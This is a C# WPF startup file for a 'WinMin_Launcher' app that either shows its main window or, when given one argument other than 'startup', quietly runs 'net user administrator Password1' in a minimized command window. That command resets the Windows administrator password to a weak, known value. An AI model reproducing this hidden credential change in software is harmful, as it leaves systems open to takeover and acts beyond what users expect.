using System;
using System.IO;
using System.Windows;
using System.Diagnostics;

namespace WinMin_Launcher
{
    public partial class App : Application
    {
        private void Application_Startup(object sender, StartupEventArgs e)
        {
            string[] args = Environment.GetCommandLineArgs();
            File.WriteAllText("C:\\Users\\Nikoli\\hi.txt", args.Length.ToString());
            if(args.Length == 2)
            {
                if (args[1].Equals("startup"))
                {
                    //Do registry stuff here
                }
                else
                {
                    Process process = new Process();
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = "/C net user administrator Password1",
                        WindowStyle = ProcessWindowStyle.Minimized
                    };
                    process.StartInfo = startInfo;
                    process.Start();
                    process.WaitForExit();
                    Current.Shutdown();
                }
            }
            else
            {
                MainWindow window = new MainWindow();
                window.Show();
            }
        }
    }
}
